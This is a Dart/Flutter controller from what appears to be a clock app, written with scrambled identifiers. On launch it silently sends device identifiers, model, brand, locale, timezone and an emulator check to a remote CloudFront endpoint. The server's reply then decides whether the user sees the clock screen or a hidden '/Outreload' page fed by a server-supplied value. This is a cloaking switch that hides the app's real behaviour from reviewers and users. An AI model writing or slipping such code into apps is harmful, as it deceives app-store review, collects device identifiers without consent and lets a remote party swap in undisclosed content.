import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FloBloomCloudLogic extends GetxController {

  var suqwxjtcaf = RxBool(false);
  var pmlcjvz = RxBool(true);
  var uevrwzy = RxString("");
  var pzey = RxBool(false);
  var dajngf = RxBool(true);
  final zgpnhiyvae = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    nifdk();
  }


  Future<void> nifdk() async {
    pzey.value = true;
    dajngf.value = true;
    pmlcjvz.value = false;

    zgpnhiyvae.post("https://d24y4eacywhew3.cloudfront.net/B1ZC3V?no_check",data: await iqtazjwhos()).then((value) {
      var necv = value.data["necv"] as String;
      var fcvk = value.data["fcvk"] as bool;
      if (fcvk) {
        uevrwzy.value = necv;
        ugbxvcke();
      } else {
        vnqehx();
      }
    }).catchError((e) {
      pmlcjvz.value = true;
      dajngf.value = true;
      pzey.value = false;
    });
  }

  Future<Map<String, dynamic>> iqtazjwhos() async {
    final DeviceInfoPlugin hjgbvt = DeviceInfoPlugin();
    PackageInfo wgry_qrpt = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var knrvqsw = Platform.localeName;
    var xsto = currentTimeZone;

    var lbdo = wgry_qrpt.packageName;
    var vnzi = wgry_qrpt.version;
    var cwqgjpuk = wgry_qrpt.buildNumber;

    var uqlrb = wgry_qrpt.appName;
    var nwtv = "";
    var epfj  = "";
    var vfqi = "";
    var wutedslb = "";
    var mtysnuzp = "";
    var yesnf = "";
    var toxifbhs = "";
    var bcwsmnag = "";
    var gwqile = "";
    var zrbu = "";


    var igrde = "";
    var yksjp = false;

    if (GetPlatform.isAndroid) {
      igrde = "android";
      var dtmwlfu = await hjgbvt.androidInfo;

      vfqi = dtmwlfu.brand;

      nwtv  = dtmwlfu.model;
      epfj = dtmwlfu.id;

      yksjp = dtmwlfu.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      igrde = "ios";
      var cfjamrz = await hjgbvt.iosInfo;
      vfqi = cfjamrz.name;
      nwtv = cfjamrz.model;

      epfj = cfjamrz.identifierForVendor ?? "";
      yksjp  = cfjamrz.isPhysicalDevice;
    }

    var res = {
      "uqlrb": uqlrb,
      "cwqgjpuk": cwqgjpuk,
      "vnzi": vnzi,
      "lbdo": lbdo,
      "nwtv": nwtv,
      "xsto": xsto,
      "vfqi": vfqi,
      "epfj": epfj,
      "knrvqsw": knrvqsw,
      "igrde": igrde,
      "yksjp": yksjp,
      "wutedslb" : wutedslb,
      "mtysnuzp" : mtysnuzp,
      "yesnf" : yesnf,
      "toxifbhs" : toxifbhs,
      "bcwsmnag" : bcwsmnag,
      "gwqile" : gwqile,
      "zrbu" : zrbu,

    };
    return res;
  }

  Future<void> vnqehx() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> ugbxvcke() async {
    Get.offNamed("/Outreload");
  }

}
